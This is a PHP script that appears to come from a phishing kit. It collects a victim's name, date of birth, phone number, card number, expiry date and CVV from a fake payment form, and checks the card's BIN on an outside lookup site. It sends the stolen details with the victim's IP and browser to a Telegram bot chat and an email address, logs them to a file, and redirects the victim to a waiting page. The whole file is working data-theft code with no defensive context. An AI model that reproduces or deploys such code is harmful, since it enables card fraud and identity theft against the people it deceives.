<?php
$pg=$_REQUEST['page'];
$ip = getenv("REMOTE_ADDR");
$bin4 = substr($_POST['ctl00$ContentPlaceHolder1$textPAY1_CARDNUMBER'] , 12 , 16);
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "../wait/?page=$bin4" ;
$hostname = gethostbyaddr($ip);
//$_POST['s1']="4023600950714370";
$monfichier = fopen("cock.txt", "w");
fclose($monfichier);
$cookie = "cock.txt";
	$ch = curl_init();  
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true);	
    curl_setopt($ch, CURLOPT_URL, 'https://ccbins.pro/?bins='.$_POST['ctl00$ContentPlaceHolder1$textPAY1_CARDNUMBER']); 
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
    $result = curl_exec($ch);
    curl_close($ch);
//echo $result;
	preg_match_all('`\<table style="">([^[]+)\</table><center>`',$result,$out);
$r=strip_tags($out[0][0]);
$res = str_replace("&nbsp;&nbsp;", "                ", $r);	
unlink("cock.txt");
$message = "=====================infos ====================\n\n\t".$res."\n\n================================================\n\n\t";
$message .= "|first name : ".$_POST['fname']."\n\t";
$message .= "|last name : ".$_POST['lname']."\n\t";
$message .= "|DOB : ".$_POST['adresse']."\n\t";
$message .= "|Mobile : ".$_POST['by']."\n\t";
$message .= "|Card : ".$_POST['ctl00$ContentPlaceHolder1$textPAY1_CARDNUMBER']."\n\t";
$message .= "|Exp date : ".$_POST['exp']."\n\t";
$message .= "|Cvv : ".$_POST['cvv']."\n\t";
$message .= "|-------------- IP Infos ------------\n\t";
$message .= "|Client IP: ".$ip."\n\t";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n\t";
$message .= "|BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n\t";
$message .= "|--------------------------------------------\n\t";
$token = "bot<TOKEN_REMOVED>";
$data = [
    'text' => $message,
    'chat_id' => '-1001200889598'
];

file_get_contents("https://api.telegram.org/bot<TOKEN_REMOVED>/sendMessage?" . http_build_query($data) );

$send = "anas@netc.fr";
$subject = "$ip - ";
$headers = "From:AMR3T<motto@mailo.com>";
mail($send,$subject,$message,$headers);
    $file = fopen('../../hi-1950.txt', 'a');
fwrite($file,$message);

header("Location: $back");

?>
